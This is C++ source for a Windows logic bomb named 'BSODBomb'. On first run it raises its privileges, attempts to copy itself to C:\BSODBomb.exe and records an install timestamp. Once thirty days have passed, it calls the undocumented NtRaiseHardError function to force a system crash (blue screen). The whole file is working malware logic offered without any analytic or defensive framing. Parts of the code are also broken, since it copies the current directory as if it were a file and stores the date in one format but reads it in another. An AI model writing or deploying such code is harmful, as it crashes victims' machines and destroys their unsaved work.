#include <iostream>
#include <fstream>
#include <string>
#include <iomanip>
#include <ctime>
#include <chrono>
#include <Windows.h>
#include <winternl.h>
#include <sstream>

#define SE_BACKUP_PRIVILEGE 17
#define SE_RESTORE_PRIVILEGE 18
#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

int main() {
    bool fileExists = std::ifstream("installed.txt").good();

    if (!fileExists) {
        BOOLEAN bEnabled;

        LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");

        pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;

        RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &bEnabled);
        RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &bEnabled);

        std::string sourceFilePath = ".";  // Current directory in C++
        std::string destinationFilePath = "C:\\BSODBomb.exe";

        std::ifstream sourceFile(sourceFilePath, std::ios::binary);
        std::ofstream destinationFile(destinationFilePath, std::ios::binary);
        destinationFile << sourceFile.rdbuf();  // Copy file contents

        std::ofstream fs("installed.txt");
        auto currentDate = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::time_t const now_c = std::time(0);
        fs << now_c;
        std::cout << "Hello" << std::endl;
        std::cout << "Worked!" << std::endl;
        return 0;
    }
    else {
        std::ifstream inputFile("installed.txt");
        std::string installedDate;
        std::getline(inputFile, installedDate);
        std::tm startDate{};
        std::istringstream ss(installedDate);
        ss >> std::get_time(&startDate, "%a %b %d %H:%M:%S %Y");

        std::chrono::duration<int, std::ratio<60 * 60 * 24>> duration(30);
        auto currentDate = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());

        std::chrono::duration<double> elapsed = std::chrono::system_clock::from_time_t(currentDate) - std::chrono::system_clock::from_time_t(std::mktime(&startDate));

        if (elapsed >= duration) {
            BOOLEAN bEnabled;
            ULONG uResp;

            LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
            LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

            pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
            pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

            RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);
            NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
        }
        else {
            return 0;
        }
    }

    return 0;
}
